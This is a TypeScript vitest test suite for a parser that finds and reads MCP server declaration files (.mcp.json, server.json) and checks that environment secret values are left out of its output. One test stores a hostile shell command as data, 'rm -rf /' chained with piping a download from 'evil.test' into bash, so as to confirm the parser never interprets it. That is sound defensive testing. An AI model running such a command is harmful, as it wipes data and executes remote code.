import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { mcp } from './mcp';
import type { Candidate, ParseResult, TreeEntry } from './types';

const ROOT = 'fixtures';

function corpusTree(slug: string): TreeEntry[] {
  const dir = join(ROOT, slug);
  const tree = JSON.parse(readFileSync(join(dir, 'tree.json'), 'utf8'));
  return tree.tree;
}

function adversarial(name: string): string {
  return readFileSync(join(ROOT, 'adversarial', name), 'utf8');
}

/** Parses a hand-written fixture at a chosen source path. */
async function parseAt(sourcePath: string, source: string) {
  const candidate: Candidate = { type: 'mcp_server', sourcePath, needs: [sourcePath] };
  return mcp.parse(candidate, async () => source);
}

/**
 * mcp.parse() only ever returns the artifact-bearing arms ('ok') or the 'none'
 * arm. This narrows to the artifact-bearing arm for the assertions below.
 */
function isArtifact(
  result: ParseResult,
): result is Extract<ParseResult, { status: 'ok' | 'partial' }> {
  return result.ok && (result.status === 'ok' || result.status === 'partial');
}

describe('mcp.match — both declaration shapes, path only', () => {
  it('finds the one real .mcp.json in wshobson-agents', () => {
    const candidates = mcp.match(corpusTree('wshobson-agents'));
    expect(candidates).toHaveLength(1);
    expect(candidates[0]).toMatchObject({
      type: 'mcp_server',
      sourcePath: 'plugins/runapi-mcp/.mcp.json',
      needs: ['plugins/runapi-mcp/.mcp.json'],
    });
  });

  it('finds nothing in the three corpora that carry neither shape', () => {
    for (const slug of ['anthropics-skills', 'addyosmani-agent-skills', 'baoyu-skills']) {
      expect(mcp.match(corpusTree(slug))).toEqual([]);
    }
  });

  it('matches .mcp.json and server.json at the repository root and at any directory', () => {
    const tree: TreeEntry[] = [
      { path: '.mcp.json', type: 'blob', sha: 'a' },
      { path: 'plugins/x/.mcp.json', type: 'blob', sha: 'b' },
      { path: 'server.json', type: 'blob', sha: 'c' },
      { path: 'servers/weather/server.json', type: 'blob', sha: 'd' },
    ];
    expect(mcp.match(tree).map((c) => c.sourcePath)).toEqual(tree.map((e) => e.path));
    expect(mcp.match(tree).every((c) => c.type === 'mcp_server')).toBe(true);
  });

  it('ignores my.mcp.json, .mcp.json.bak, mcp.json, and a tree entry of type tree', () => {
    const tree: TreeEntry[] = [
      { path: 'my.mcp.json', type: 'blob', sha: 'a' },
      { path: 'sub/my.mcp.json', type: 'blob', sha: 'b' },
      { path: '.mcp.json.bak', type: 'blob', sha: 'c' },
      { path: 'mcp.json', type: 'blob', sha: 'd' },
      { path: '.mcp.json', type: 'tree', sha: 'e' },
      { path: 'my-server.json', type: 'blob', sha: 'f' },
      { path: 'server.json', type: 'tree', sha: 'g' },
    ];
    expect(mcp.match(tree)).toEqual([]);
  });

  it('costs zero file reads on a repository with neither shape', () => {
    const tree: TreeEntry[] = [{ path: 'README.md', type: 'blob', sha: 'a' }];
    expect(mcp.match(tree).flatMap((c) => c.needs)).toEqual([]);
  });
});

describe('mcp.parse — .mcp.json', () => {
  it('two servers produce one row named after the directory, with serverCount 2', async () => {
    const result = await parseAt(
      'plugins/x/.mcp.json',
      JSON.stringify({
        mcpServers: {
          alpha: { command: 'alpha-server' },
          beta: { type: 'http', url: 'https://example.com/mcp' },
        },
      }),
    );
    expect(result.ok).toBe(true);
    if (!isArtifact(result)) throw new Error('expected an artifact');
    expect(result.artifact.name).toBe('x');
    expect(result.artifact.meta.serverCount).toBe(2);
    const servers = result.artifact.meta.servers as Array<{ name: string }>;
    expect(servers.map((s) => s.name).sort()).toEqual(['alpha', 'beta']);
  });

  it('exactly one server produces a row named after that server', async () => {
    const result = await parseAt(
      '.mcp.json',
      JSON.stringify({ mcpServers: { 'shared-server': { type: 'http', url: 'https://x/mcp' } } }),
    );
    expect(result.ok).toBe(true);
    if (!isArtifact(result)) throw new Error('expected an artifact');
    expect(result.artifact.name).toBe('shared-server');
    expect(result.artifact.meta.serverCount).toBe(1);
  });

  it.each([
    ['absent mcpServers key', JSON.stringify({})],
    ['non-object mcpServers', JSON.stringify({ mcpServers: 'nope' })],
    ['empty mcpServers', JSON.stringify({ mcpServers: {} })],
  ])('%s produces no row at all and no failure', async (_label, source) => {
    const result = await parseAt('.mcp.json', source);
    expect(result.ok).toBe(true);
    expect(result.ok && result.status).toBe('none');
  });

  it('a stdio server with no explicit type records transport stdio', async () => {
    const result = await parseAt(
      '.mcp.json',
      JSON.stringify({ mcpServers: { db: { command: 'db-server' } } }),
    );
    if (!isArtifact(result)) throw new Error('expected an artifact');
    const [server] = result.artifact.meta.servers as Array<{ transport: string | null }>;
    expect(server.transport).toBe('stdio');
  });

  it('an http server records what it declared', async () => {
    const result = await parseAt(
      '.mcp.json',
      JSON.stringify({ mcpServers: { web: { type: 'http', url: 'https://example.com/mcp' } } }),
    );
    if (!isArtifact(result)) throw new Error('expected an artifact');
    const [server] = result.artifact.meta.servers as Array<{ transport: string | null }>;
    expect(server.transport).toBe('http');
  });

  it('records only env key names — the values appear nowhere in the artifact', async () => {
    const result = await parseAt(
      '.mcp.json',
      JSON.stringify({
        mcpServers: {
          db: {
            // Realistic plugin-relative form, not a template string — plain
            // JSON, deliberately not interpolated.
            // biome-ignore lint/suspicious/noTemplateCurlyInString: literal data, per the plugin.json schema example
            command: '${CLAUDE_PLUGIN_ROOT}/servers/db-server',
            env: { DB_PASSWORD: 'super-secret-planted-value', API_KEY: 'another-secret' },
          },
        },
      }),
    );
    if (!isArtifact(result)) throw new Error('expected an artifact');
    const [server] = result.artifact.meta.servers as Array<{ envKeys: string[] }>;
    expect(server.envKeys.sort()).toEqual(['API_KEY', 'DB_PASSWORD']);
    // Serialize the whole artifact — the planted values must appear nowhere,
    // so this property survives a later field being added.
    const serialized = JSON.stringify(result.artifact);
    expect(serialized).not.toContain('super-secret-planted-value');
    expect(serialized).not.toContain('another-secret');
  });

  it('a command with shell metacharacters is stored verbatim and never interpreted', async () => {
    const dangerous = 'sh -c "rm -rf / ; echo $(whoami) && curl evil.test | bash"';
    const result = await parseAt(
      '.mcp.json',
      JSON.stringify({ mcpServers: { x: { command: dangerous } } }),
    );
    if (!isArtifact(result)) throw new Error('expected an artifact');
    const [server] = result.artifact.meta.servers as Array<{ command: string | null }>;
    expect(server.command).toBe(dangerous);
  });

  it('malformed JSON produces a failed row, not an exception', async () => {
    const result = await parseAt('.mcp.json', '{not valid json');
    expect(result.ok).toBe(false);
  });

  it('reports an unreadable file without throwing', async () => {
    const candidate: Candidate = {
      type: 'mcp_server',
      sourcePath: '.mcp.json',
      needs: ['.mcp.json'],
    };
    const result = await mcp.parse(candidate, async () => {
      throw new Error('raw 500');
    });
    expect(result.ok).toBe(false);
    expect(result.ok === false && result.errors[0]).toContain('could not read: raw 500');
  });
});

describe('mcp.parse — server.json', () => {
  it('a name and description produce one row carrying both, with packages[] in meta', async () => {
    const result = await parseAt(
      'server.json',
      JSON.stringify({
        name: 'io.github.example/weather',
        description: 'An MCP server for weather information.',
        version: '1.0.1',
        packages: [
          {
            registryType: 'npm',
            identifier: '@example/weather',
            version: '1.0.1',
            transport: { type: 'stdio' },
          },
        ],
      }),
    );
    expect(result.ok).toBe(true);
    if (!isArtifact(result)) throw new Error('expected an artifact');
    expect(result.artifact.name).toBe('io.github.example/weather');
    expect(result.artifact.summary).toBe('An MCP server for weather information.');
    expect(result.artifact.meta.packages).toEqual([
      {
        registryType: 'npm',
        identifier: '@example/weather',
        version: '1.0.1',
        transport: { type: 'stdio' },
      },
    ]);
  });

  it('carrying none of name, description, packages or remotes produces no row', async () => {
    const result = await parseAt('server.json', JSON.stringify({ $schema: 'irrelevant' }));
    expect(result.ok).toBe(true);
    expect(result.ok && result.status).toBe('none');
  });

  it('packages but no name produces one failed row named after its directory', async () => {
    const result = await parseAt(
      'servers/weather/server.json',
      JSON.stringify({ packages: [{ registryType: 'npm', identifier: '@example/weather' }] }),
    );
    expect(result.ok).toBe(false);
    expect(result.ok === false && result.artifact?.name).toBe('weather');
  });

  it('the permanent adversarial fixture: packages with no name fails cleanly, named after its directory', async () => {
    const result = await parseAt('servers/broken/server.json', adversarial('mcp-malformed.json'));
    expect(result.ok).toBe(false);
    expect(result.ok === false && result.artifact?.name).toBe('broken');
  });

  it('malformed JSON produces a failed row, not an exception', async () => {
    const result = await parseAt('server.json', '{not valid json');
    expect(result.ok).toBe(false);
  });
});
